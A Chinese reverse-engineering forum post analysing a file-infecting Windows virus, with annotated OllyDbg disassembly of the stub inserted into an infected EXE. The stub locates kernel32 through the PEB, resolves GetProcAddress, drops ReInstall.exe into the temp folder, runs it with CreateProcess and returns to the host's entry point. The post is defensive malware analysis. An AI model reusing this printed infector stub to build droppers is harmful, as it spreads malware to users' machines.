

# 一种恶性病毒的中毒文件分析报告

> 原文：[`www.pediy.com/kssd/pediy11/105491.html`](https://www.pediy.com/kssd/pediy11/105491.html)

【原创】一种恶性病毒的中毒文件分析报告  
    系统越变越慢，出现莫名其妙的错误，安装文件统统不能运行，点击就报告文件 size 发生变化！重做系统后，只要一运行其它盘的 EXE 文件，一会儿功夫，系统又白做了！杀毒软件一个个试，没有一个有反应的，无语！  
   你遇到这个问题了没？我真想把这病毒的作者撕了！太恶毒了！！！![](img/7eab1bc95cbb1be9f15eb01bf012328f.jpg "狂怒")  
     我等小菜，也没办法，只好随便用 OD 来逆向一个 EXE 文件看看病毒在里面到底干了些什么，一运行 OD，又中招了！！！我晕，做得太绝了！  
    好在有备份！再次恢复系统，用备份的 OD 运行，随便找了一个 EXE 文件（我以前用 DOS 写的双色球选号器，只有 40K 左右的文件被感染后成了 220 多 K 了！！！）  
    愤怒地用 OD 加载，从头看来，下面是分析报告：![](img/9b2aec7f3d4bb041b2d419a59832192f.jpg "恐怖!")  
  
00413000 > $  B8 30000000   mov     eax, 30             ; 这里就是中毒文件的 OEP,不可思议吧！  
00413005   .  90            nop  
00413006   .  64:8B38       mov     edi, dword ptr fs:\[eax\]             ;  获取 PEB 的结构地址  
00413009   .  8B7F 0C       mov     edi, dword ptr \[edi+C\]              ;  得到\_PEB\_LDR\_DATA 结构地址  
0041300C   .  8B7F 1C       mov     edi, dword ptr \[edi+1C\]             ;  FLINK 所指为 NTDLL.dll 的 InInitializationOrderModuleList 线性地址  
0041300F   .  8B3F          mov     edi, dword ptr \[edi\]                ;  FLINK 所指的结构体取下一个结点，即 Kernel32.dll 对应的结构  
00413011   .  8B7F 08       mov     edi, dword ptr \[edi+8\]              ;  EDI=FLINK+sizeof(LIST\_ENTRY)对应\_LDR\_MODULE.BaseAddress，即 Kernel32.dll 的基址  
00413014   .  E8 00000000   call    00413019  
00413019   $  5B            pop     ebx  
0041301A   .  81EB 19104000 sub     ebx, 00401019  
00413020   .  89BB ED114000 mov     dword ptr \[ebx+4011ED\], edi         ;  存放 kernel32.dll 基地址  
00413026   .  8BF7          mov     esi, edi                            ;  下面是病毒直接用对应的 PEHADER 结构体大小计算的  
00413028   .  0376 3C       add     esi, dword ptr \[esi+3C\]             ;  得到 Kernel32.dll PE 文件标识“PE” Signature  
0041302B   .  8B76 78       mov     esi, dword ptr \[esi+78\]             ;  输出表 RVA = IMAGE\_DATA\_DIRECTORY\[0\].VirtualAddres  
0041302E   .  03F7          add     esi, edi                            ;  输出表实际地址 = BaseAddress+RVA  
00413030   .  56            push    esi                                 ;  保存输出表实际地址  
00413031   .  8B6E 18       mov     ebp, dword ptr \[esi+18\]  
00413034   .  8B76 20       mov     esi, dword ptr \[esi+20\]             ;  ESI = 导出函数名地址表 RVA 地址 \_IMAGE\_EXPORT\_DIRECTORY.AddressOfNames  
00413037   .  03F7          add     esi, edi                            ;  导出函数名地址表的实际地址 = (ESI += Kernel32.BaseAddress )  
00413039   .  33D2          xor     edx, edx  
0041303B   >  56            push    esi                                 ;  保存函数名地址表的实际地址  
0041303C   .  8B3E          mov     edi, dword ptr \[esi\]                ;  取导出函数地址表中的函数函数名的相对地址  
0041303E   .  03BB ED114000 add     edi, dword ptr \[ebx+4011ED\]         ;  实际函数名的地址 = 相对地址 RVA+基址  
00413044   .  8DB3 C6114000 lea     esi, dword ptr \[ebx+4011C6\]         ;  病毒注入的 GetProcAdrress 名称  
0041304A   .  90            nop  
0041304B   .  B9 0F000000   mov     ecx, 0F  
00413050   .  F3:A6         repe    cmps byte ptr es:\[edi\], byte ptr \[e>;  比较 查找 GetProcAddress 函数地址(GetProcAddress 加结束符正好 15 字节长)  
00413052   .  75 06         jnz     short 0041305A  
00413054   .  5E            pop     esi  
00413055   .  8BD6          mov     edx, esi  
00413057   .  5E            pop     esi  
00413058   .  EB 11         jmp     short 0041306B  
0041305A   >  5E            pop     esi  
0041305B   .  83C6 04       add     esi, 4  
0041305E   .  42            inc     edx  
0041305F   .  3BD5          cmp     edx, ebp  
00413061   .^ 72 D8         jb      short 0041303B                      ;  此处如果 NOP 掉，循环被破坏，直接就跳往 OEP，病毒就失灵了！  
00413063   .  83EC 04       sub     esp, 4  
00413066   .  E9 23010000   jmp     0041318E  
0041306B   >  2B56 20       sub     edx, dword ptr \[esi+20\]  
0041306E   .  8B83 ED114000 mov     eax, dword ptr \[ebx+4011ED\]  
00413074   .  2BD0          sub     edx, eax  
00413076   .  D1EA          shr     edx, 1  
00413078   .  0356 24       add     edx, dword ptr \[esi+24\]  
0041307B   .  03D0          add     edx, eax  
0041307D   .  0FB702        movzx   eax, word ptr \[edx\]  
00413080   .  C1E0 02       shl     eax, 2  
00413083   .  0346 1C       add     eax, dword ptr \[esi+1C\]  
00413086   .  0383 ED114000 add     eax, dword ptr \[ebx+4011ED\]  
0041308C   .  8B00          mov     eax, dword ptr \[eax\]  
0041308E   .  0383 ED114000 add     eax, dword ptr \[ebx+4011ED\]         ;  终于得到了，折腾半天!GetProcAddress 函数实际地址  
00413094   .  8BF8          mov     edi, eax                            ;    
  
kernel32.GetProcAddress  
00413096   .  8BEC          mov     ebp, esp  
00413098   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
0041309E   .  8D83 A1114000 lea     eax, dword ptr \[ebx+4011A1\]  
004130A4   .  50            push    eax  
004130A5   .  52            push    edx  
004130A6   .  FFD7          call    edi                                 ;  得到 GetTmpPath 函数的地址  
004130A8   .  81EC 04010000 sub     esp, 104  
004130AE   .  54            push    esp  
004130AF   .  68 04010000   push    104  
004130B4   .  FFD0          call    eax                                 ;  执行 GetTmpPath 得到临时目录  
004130B6   .  8D83 BD114000 lea     eax, dword ptr \[ebx+4011BD\]  
004130BC   .  50            push    eax  
004130BD   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
004130C3   .  52            push    edx  
004130C4   .  FFD7          call    edi                                 ;  得到 lstrcat 函数地址  
004130C6   .  8D8B 93114000 lea     ecx, dword ptr \[ebx+401193\]  
004130CC   .  51            push    ecx  
004130CD   .  8BCC          mov     ecx, esp  
004130CF   .  83C1 04       add     ecx, 4  
004130D2   .  51            push    ecx  
004130D3   .  FFD0          call    eax                                 ;  将病毒名与临时目录连接形成 xxx/ReInstall.exe  
004130D5   .  8D83 E1114000 lea     eax, dword ptr \[ebx+4011E1\]  
004130DB   .  50            push    eax  
004130DC   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
004130E2   .  52            push    edx  
004130E3   .  FFD7          call    edi                                 ;  得到 CreateFileA 的函数地址  
004130E5   .  8BCC          mov     ecx, esp  
004130E7   .  6A 00         push    0  
004130E9   .  68 80000000   push    80  
004130EE   .  6A 02         push    2  
004130F0   .  6A 00         push    0  
004130F2   .  6A 00         push    0  
004130F4   .  68 000000C0   push    C0000000  
004130F9   .  51            push    ecx  
004130FA   .  FFD0          call    eax                                 ;  CreateFile 建立 ReInstall.exe  
004130FC   .  8BF0          mov     esi, eax  
004130FE   .  8D8B F1114000 lea     ecx, dword ptr \[ebx+4011F1\]  
00413104   .  51            push    ecx  
00413105   .  51            push    ecx  
00413106   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
0041310C   .  52            push    edx  
0041310D   .  FFD7          call    edi                                 ;  得到 WriteFile 函数地址  
0041310F   .  59            pop     ecx  
00413110   .  6A 00         push    0  
00413112   .  51            push    ecx  
00413113   .  83C1 0A       add     ecx, 0A  
00413116   .  8B11          mov     edx, dword ptr \[ecx\]  
00413118   .  52            push    edx  
00413119   .  51            push    ecx  
0041311A   .  BA 4D5A9000   mov     edx, 905A4D  
0041311F   .  8911          mov     dword ptr \[ecx\], edx  
00413121   .  56            push    esi  
00413122   .  BA 2C114000   mov     edx, 0040112C  
00413127   .  03D3          add     edx, ebx  
00413129   .  52            push    edx  
0041312A   .  50            push    eax                                 ;  非常巧妙的 ret,继续向下执行，相同于调用 CALL WriteFile 函数  
0041312B   .  C3            retn                                        ;  执行 WriteFile,写入 ReInstall.exe 内容  
  
  
看堆栈！！！ 死病毒，改了 EXE 文件多少字节内容啊！！！！![](img/7eab1bc95cbb1be9f15eb01bf012328f.jpg "狂怒")  
![](img/38e7ba9545ab1e77b68fc01506c52ecc.jpg)  
  
0041312C   .  56            push    esi  
0041312D   .  8D35 D5114000 lea     esi, dword ptr \[4011D5\]  
00413133   .  8BC6          mov     eax, esi  
00413135   .  5E            pop     esi  
00413136   .  03C3          add     eax, ebx  
00413138   .  50            push    eax  
00413139   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
0041313F   .  52            push    edx  
00413140   .  FFD7          call    edi                                 ;  通过 GetProcAddress 得到 CloseHandle 函数地址  
00413142   .  56            push    esi  
00413143   .  FFD0          call    eax                                 ;  CloseHandle 文件句柄  
00413145   .  8D83 AE114000 lea     eax, dword ptr \[ebx+4011AE\]  
0041314B   .  50            push    eax  
0041314C   .  8B93 ED114000 mov     edx, dword ptr \[ebx+4011ED\]  
00413152   .  52            push    edx  
00413153   .  FFD7          call    edi                                 ;  得到 CreateProcess 函数地址  
00413155   .  83EC 44       sub     esp, 44  
00413158   .  8BD4          mov     edx, esp  
0041315A   .  BE 00000000   mov     esi, 0  
0041315F   .  B9 11000000   mov     ecx, 11  
00413164   >  8932          mov     dword ptr \[edx\], esi  
00413166   .  83C2 04       add     edx, 4  
00413169   .^ E2 F9         loopd   short 00413164  
0041316B   .  BA 44000000   mov     edx, 44  
00413170   .  891424        mov     dword ptr \[esp\], edx  
00413173   .  83EC 10       sub     esp, 10  
00413176   .  8BD4          mov     edx, esp  
00413178   .  54            push    esp  
00413179   .  83C2 10       add     edx, 10  
0041317C   .  52            push    edx  
0041317D   .  33C9          xor     ecx, ecx  
0041317F   .  51            push    ecx  
00413180   .  51            push    ecx  
00413181   .  51            push    ecx  
00413182   .  51            push    ecx  
00413183   .  51            push    ecx  
00413184   .  51            push    ecx  
00413185   .  51            push    ecx  
00413186   .  83C2 44       add     edx, 44  
00413189   .  52            push    edx  
0041318A   .  FFD0          call    eax                                 ;  通过 CreateProcess 调用病毒体  
0041318C   .  8BE5          mov     esp, ebp  
0041318E   >- E9 D901FFFF   jmp     0040336C                            ;  跳回原 EXE 的 OEP 处  
  
继续执行，在这之后 DUMP 亦可  
  
再下面是病毒用到的字串及函数名定义：  
![](img/dfdf2f86d813b0904a82998cd020d502.jpg)  
  
最后，再次劳骚一句，写啥不行啊，偏要写病毒！不能做点对社会有用的事情么？？？![](img/7eab1bc95cbb1be9f15eb01bf012328f.jpg "狂怒")